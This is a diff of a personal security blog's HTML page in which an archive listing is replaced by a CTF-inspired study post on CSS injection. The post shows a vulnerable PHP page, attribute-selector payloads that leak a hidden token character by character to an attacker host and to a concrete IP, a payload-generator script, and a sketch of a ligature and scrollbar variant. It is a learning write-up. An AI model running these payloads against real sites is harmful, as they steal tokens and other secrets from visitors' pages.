@@ -7,17 +7,25 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://glotozz.github.io">
-  <title>Archives: 2019 | 往者不可谏，来者犹可追 | glotozz&#39;blog</title>
+  <title>css注入学习 | 往者不可谏，来者犹可追 | glotozz&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="referrer" content="no-referrer">
   <!--more-->
-  <meta property="og:type" content="website">
-<meta property="og:title" content="往者不可谏，来者犹可追 | glotozz&#39;blog">
-<meta property="og:url" content="https://glotozz.github.io/archives/2019/page/2/index.html">
+  <meta name="keywords" content="css注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="css注入学习">
+<meta property="og:url" content="https://glotozz.github.io/2019/12/02/css注入学习/index.html">
 <meta property="og:site_name" content="往者不可谏，来者犹可追 | glotozz&#39;blog">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="https://i.loli.net/2019/12/02/sY67MpeoVzg9ZdS.png">
+<meta property="og:image" content="https://i.loli.net/2019/12/02/DCOs2xdg1JkTcUY.png">
+<meta property="og:image" content="https://i.loli.net/2019/12/02/zU13vH79y2tfBFR.png">
+<meta property="og:image" content="https://i.loli.net/2019/12/02/x1yT3oj2CFUr6wK.png">
+<meta property="og:image" content="https://i.loli.net/2019/12/02/v8kXTaqdIWFLpyN.png">
+<meta property="og:updated_time" content="2019-12-02T04:45:40.286Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="往者不可谏，来者犹可追 | glotozz&#39;blog">
+<meta name="twitter:title" content="css注入学习">
+<meta name="twitter:image" content="https://i.loli.net/2019/12/02/sY67MpeoVzg9ZdS.png">
   
   
     <link rel="icon" href="https://raw.githubusercontent.com/glotozz/images/master/bitbug_favicon.ico">
@@ -149,444 +157,252 @@
           </div>
           <div id="js-content" class="content-ll">
             
+<article id="post-css注入学习" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      css注入学习
+    </h1>
   
+
+        
+        <a href="/2019/12/02/css注入学习/" class="archive-article-date">
+  	<time datetime="2019-12-02T01:19:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-12-02</time>
+</a>
+        
+      </header>
     
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<p><strong>这次安洵杯考到了，知识盲区，补一下</strong></p>
+<blockquote>
+<p><strong>css本身是一种容错率很强的语言，css文件即使遇到错误，也会一直读取，直到有符合结构的语句</strong>。<br>我们可以利用css解析的容错性构造 </p>
+<p><code>%0a){}body{color:red}/*</code> 来执行任意css。 </p>
+</blockquote>
+<h4 id="一、假设一个php页面"><a href="#一、假设一个php页面" class="headerlink" title="一、假设一个php页面"></a>一、假设一个php页面</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$token1 = md5($_SERVER[&apos;HTTP_USER_AGENT&apos;]);</span><br><span class="line">$token2 = md5($token1);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!doctype html&gt;&lt;meta charset=utf-8&gt;</span><br><span class="line">&lt;input type=hidden value=&lt;?=$token1 ?&gt;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var TOKEN = &quot;&lt;?=$token2 ?&gt;&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">    &lt;?=preg_replace(&apos;#&lt;/style#i&apos;, &apos;#&apos;, $_GET[&apos;css&apos;]) ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="二、窃取input标签中的token"><a href="#二、窃取input标签中的token" class="headerlink" title="二、窃取input标签中的token"></a>二、窃取input标签中的token</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/*选择value值为abc的input标签*/</span><br><span class="line">input[value=&quot;abc&quot;] &#123; &#125;</span><br><span class="line"></span><br><span class="line">/*选择value值以a开头的input标签 */</span><br><span class="line">input[value^=&quot;a&quot;] &#123; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么我们就可以通过上面的来爆破第一个字符</p>
+<p>比如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">input[value^=&quot;0&quot;] &#123;</span><br><span class="line">    background: url(http://serwer-napastnika/0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/12/02/sY67MpeoVzg9ZdS.png" alt="Snipaste_2019-12-02_10-09-53.png"></p>
+<p>有个坑，最新版火狐如果<code>type=hiddden</code>会无法加载，上面的图是删去<code>type=hidden</code>的时候</p>
+<p><img src="https://i.loli.net/2019/12/02/DCOs2xdg1JkTcUY.png" alt="Snipaste_2019-12-02_10-13-33.png"></p>
+<p><code>chrome</code>可以</p>
+<p>一开始想着构造payload然后用脚本发包，发现脚本发的会收不到，原因可能是因为这是浏览器去请求的。。。同样直接把payload放firefox也不行，那么就生成payload放入chorme即可，再根据vps的日志生成下一个payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">res = &quot;&quot;</span><br><span class="line">for i in &apos;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;&apos;:</span><br><span class="line">    a = &apos;input[value^=&quot;28&apos;+str(i)+&apos;&quot;] &#123;background:url(\&apos;http://59.110.164.44/28&apos;+str(i)+&apos;\&apos;);&#125;&apos;</span><br><span class="line">    print a</span><br><span class="line">    res += a+&quot;\n&quot;</span><br><span class="line">print res</span><br></pre></td></tr></table></figure>
+
+<p>题目环境关了，开一个docker</p>
+<blockquote>
+<p><a href="https://github.com/D0g3-Lab/i-SOON_CTF_2019/tree/master/Web/cssgame" target="_blank" rel="noopener">https://github.com/D0g3-Lab/i-SOON_CTF_2019/tree/master/Web/cssgame</a> </p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/12/02/zU13vH79y2tfBFR.png" alt="Snipaste_2019-12-02_11-51-45.png"></p>
+<p>这里是外链css，那么把css文件放到vps上，每次修改即可</p>
+<p><img src="https://i.loli.net/2019/12/02/x1yT3oj2CFUr6wK.png" alt="Snipaste_2019-12-02_11-53-00.png"></p>
+<p><img src="https://i.loli.net/2019/12/02/v8kXTaqdIWFLpyN.png" alt="Snipaste_2019-12-02_11-53-22.png"></p>
+<h4 id="三、窃取-lt-script-gt-标签中的token"><a href="#三、窃取-lt-script-gt-标签中的token" class="headerlink" title="三、窃取&lt;script&gt;标签中的token"></a>三、窃取&lt;script&gt;标签中的token</h4><blockquote>
+<ol>
+<li>构造一个字体，把所有字符的宽度都设置为0。</li>
+<li>把「xctf」的宽度设置为10000。</li>
+<li>当页面里出现「xctf」的时候，就会出现滚动条。</li>
+<li>在滚动条的样式里，通过<code>background: url()</code>发送请求。</li>
+<li>逐位爆破。</li>
+</ol>
+</blockquote>
+<blockquote>
+<p>我们将使用连字和样式滚动条定义我们自己的字体来完成攻击。<br>什么是连字：<a href="http://www.mzh.ren/ligature-intro.html" target="_blank" rel="noopener">http://www.mzh.ren/ligature-intro.html</a></p>
+<p>借助<code>fontforge</code>等其他软件 <em>，</em>我们可以创建自己的字体包括自己的连字。<br><code>Fontforge</code>是一个相当强大的字体创建工具。我们将使用它将字体从SVG格式转换为WOFF。</p>
+</blockquote>
+<p><strong>思路还是容易理解的，复现有点麻烦，具体参考链接🤦‍♂️</strong></p>
+<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p> <a href="https://www.smi1e.top/通过css注入窃取html中的数据/" target="_blank" rel="noopener">https://www.smi1e.top/%e9%80%9a%e8%bf%87css%e6%b3%a8%e5%85%a5%e7%aa%83%e5%8f%96html%e4%b8%ad%e7%9a%84%e6%95%b0%e6%8d%ae/</a> </p>
+<p> <a href="https://xz.aliyun.com/t/6655#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/6655#toc-5</a> </p>
+
+      
+
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="https://ws1.sinaimg.cn/large/006Xmmmgly1g5wqd9c77wj309a0980u1.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+
+      
+      <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>作者:  </strong>glotozz</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>文章链接:  </strong>
+          <a href="/2019/12/02/css注入学习/" target="_blank" title="css注入学习">https://glotozz.github.io/2019/12/02/css注入学习/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处!
+          </li>
+        </ul>
+      <div>
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/18/ThinkCMF框架任意内容包含漏洞复现/" class="archive-article-date">
-  	<time datetime="2019-11-18T08:34:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-18</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/18/ThinkCMF框架任意内容包含漏洞复现/">ThinkCMF框架任意内容包含漏洞复现</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">thinkcmf</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">css注入</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://glotozz.github.io/2019/12/02/css注入学习/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/18/Typecho-反序列化漏洞复现/" class="archive-article-date">
-  	<time datetime="2019-11-18T04:05:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-18</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2019/12/01/ThinkPHP6-0反序列化复现/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ThinkPHP6.0反序列化复现</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/18/Typecho-反序列化漏洞复现/">Typecho-反序列化漏洞复现</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">typecho</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#一、假设一个php页面"><span class="toc-number">1.</span> <span class="toc-text">一、假设一个php页面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#二、窃取input标签中的token"><span class="toc-number">2.</span> <span class="toc-text">二、窃取input标签中的token</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#三、窃取-lt-script-gt-标签中的token"><span class="toc-number">3.</span> <span class="toc-text">三、窃取&lt;script&gt;标签中的token</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#参考链接："><span class="toc-number">4.</span> <span class="toc-text">参考链接：</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/18/ThinkPHP-3-X-5-X-order-by注入漏洞/" class="archive-article-date">
-  	<time datetime="2019-11-18T01:40:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-18</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/18/ThinkPHP-3-X-5-X-order-by注入漏洞/">ThinkPHP 3.X/5.X order by注入漏洞复现</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">tp3</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/16/复现几个近期漏洞/" class="archive-article-date">
-  	<time datetime="2019-11-16T04:36:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-16</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/16/复现几个近期漏洞/">复现几个漏洞</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">cve</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/13/unctf竞技赛-web/" class="archive-article-date">
-  	<time datetime="2019-11-13T04:37:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-13</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/13/unctf竞技赛-web/">unctf竞技赛-web</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">wp</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/11/buuctf-wp-6/" class="archive-article-date">
-  	<time datetime="2019-11-11T08:25:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/11/buuctf-wp-6/">buuctf-wp-6</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">wp</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/11/buuctf-wp-5/" class="archive-article-date">
-  	<time datetime="2019-11-11T00:54:23.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/11/buuctf-wp-5/">buuctf-wp-5</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">wp</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/09/湖湘杯wp/" class="archive-article-date">
-  	<time datetime="2019-11-09T11:16:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-09</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/09/湖湘杯wp/">湖湘杯网络安全技能大赛+红帽杯+百越杯wp-web</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">wp</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/08/phpcms-v9-6-0SQL注入漏洞复现/" class="archive-article-date">
-  	<time datetime="2019-11-07T23:30:10.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-08</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/08/phpcms-v9-6-0SQL注入漏洞复现/">phpcms_v9.6.0SQL注入漏洞复现</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">phpcms</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/07/phpcms-v9-6-0任意文件上传漏洞复现-1/" class="archive-article-date">
-  	<time datetime="2019-11-07T14:56:10.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-07</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/07/phpcms-v9-6-0任意文件上传漏洞复现-1/">phpcms_v9.6.0任意文件上传漏洞复现</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">phpcms</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/2019/">&laquo; Prev</a><a class="page-number" href="/archives/2019/">1</a><span class="page-number current">2</span><a class="page-number" href="/archives/2019/page/3/">3</a><a class="page-number" href="/archives/2019/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/archives/2019/page/8/">8</a><a class="extend next" rel="next" href="/archives/2019/page/3/">Next &raquo;</a>
-    </nav>
   
 
 
@@ -614,8 +430,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
